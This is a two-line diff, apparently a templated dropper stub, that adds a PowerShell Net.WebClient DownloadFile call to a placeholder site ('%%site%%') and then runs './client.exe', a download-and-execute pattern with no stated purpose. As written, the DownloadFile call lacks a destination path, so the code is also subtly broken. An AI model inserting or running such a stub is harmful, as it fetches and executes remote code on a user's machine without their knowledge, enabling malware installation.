@@ -1,0 +1,2 @@
+(New-Object Net.WebClient).DownloadFile("%%site%%")
+./client.exe
